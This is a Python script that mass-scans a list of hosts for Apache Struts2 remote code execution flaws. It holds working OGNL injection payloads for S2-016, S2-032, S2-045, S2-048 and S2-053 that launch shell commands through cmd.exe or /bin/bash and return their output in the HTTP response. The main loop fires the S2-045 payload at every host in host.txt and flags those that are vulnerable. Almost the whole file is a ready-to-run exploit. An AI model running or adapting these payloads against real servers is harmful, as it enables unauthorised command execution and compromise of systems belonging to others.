import sys
import errno, socket
import base64
import warnings
import requests
from termcolor import cprint
from requests.exceptions import ChunkedEncodingError

warnings.filterwarnings("ignore")

#################### PAYLOAD #############################
PAYLOAD = {
    "s2_016": str(
        "redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'netstat','-an'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"),
    "s2_032": str(
        "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=!nf@Sec"),
    "s2_045": str(
        "%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo !nf@Sec').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"),
    "s2_048": str(
        "age=1&__checkbox_bustedBefore=true&name=name%3D%25%7B%28%23nike%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo+%21nf%40Sec%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&description=1"),
    "s2_053": str(
        "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo+%21nf%40Sec%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D")
}
#################### Result ##############################

struts_result = ['!nf@Sec', '0.0.0.0:0']

#################### Header ##############################

header1 = {'user-agent': 'ifsec@ifsec', 'content-type': 'application/x-www-form-urlencoded'}
header2 = {'user-agent': 'ifsec@ifsec', 'Content-Type': PAYLOAD["s2_045"]}

##########################################################

Error_Message = ['Failed to establish a new connection', 'ConnectTimeoutError', "ConnectionResetError",
                 "'Remote end closed connection without response"]

##########################################################
print('URL ', 'Re_URL ', 'S_Code ', 'Struts-V ', 'Result', 'Error Message')  # Default Code

url = open("host.txt", 'r')  # Text File Read
e = ''

for line in url:
    b = line.strip('\n')
    # s2-045
    try:
        r = requests.get('http://' + b, headers=header2, timeout=5, allow_redirects=True, verify=False, stream=True)
        e = ''
        if r.url == 'http://' + b:
            for d in r.iter_lines():
                e += d.decode('utf-8')
                break
            if r.status_code == 200:
                if struts_result[0] in e:
                    print(b, r.url, r.status_code, ' s2-045', ' True')
                else:
                    print(b, r.url, r.status_code, ' s2-045', ' False')
            else :
                print (b, r.url, r.status_code, 's2-045', 'False')
        else:
            r = requests.get(r.url, headers=header2, timeout=5, allow_redirects=True, verify=False, stream=True)
            for d in r.iter_lines():
                e += d.decode('utf-8')
                break
            if r.status_code == 200:
                if struts_result[0] in e:
                    print(b, r.url, r.status_code, ' s2-045', ' True_R')
                else:
                    print(b, r.url, r.status_code, ' s2-045', ' False_R')
            else :
                print (b, r.url, r.status_code, 's2-045', 'False')

    except requests.ConnectionError as er:
        f = ''
        f += str(er)
        if Error_Message[0] in f:
            r = requests.get('https://' + b, headers=header2, timeout=5, allow_redirects=True, verify=False,
                             stream=True)
            for d in r.iter_lines():
                e += d.decode('utf-8')
                break
            if r.status_code == 200:
                if struts_result[0] in e:
                    print(b, r.url, r.status_code, ' s2-045', ' True_ConnectionAborted')
                else:
                    print(b, r.url, r.status_code, ' s2-045', ' False_ConnectionAborted')
            else :
                print (b, r.url, r.status_code, 's2-045', 'False_ConnectionAborted')


        elif Error_Message[1] in f:
            print(b, 'ConnectTimeoutError')

        elif Error_Message[2] in f:
            print(b, 'ConnectionResetError')

        elif Error_Message[3] in f:
            print(b, 'Response Code : 0')

        else:
            print(b, 'ETC_requests.ConnectionError', f)

    except Exception as errs:
        f = ''
        f += str(errs)
        print(b, 'ETC Error', f)


